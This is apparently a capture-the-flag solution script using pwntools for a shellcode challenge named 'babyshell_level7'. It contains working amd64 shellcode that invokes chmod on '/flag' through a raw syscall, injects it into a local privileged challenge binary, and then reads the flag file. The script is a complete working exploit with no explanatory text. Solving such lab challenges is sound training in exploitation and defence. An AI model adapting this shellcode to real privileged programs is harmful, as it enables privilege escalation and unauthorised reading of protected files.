from pwn import *
from warnings import filterwarnings
import os

filterwarnings(action='ignore', category=BytesWarning)
elf = ELF('/challenge/babyshell_level7', checksec=False)
context.binary = elf
context.log_level = "INFO"
shellcode = f'''
mov rax, 0x67616c662f
push rax
mov rdi, rsp
mov rsi , 4
/* call chmod() */
push SYS_chmod /* 0x5a */
pop rax
syscall
'''
p = process()
payload = asm(shellcode, arch='amd64')
p.sendlineafter("from stdin", payload)
os.system('ls -l /flag;cat /flag')
p.close()
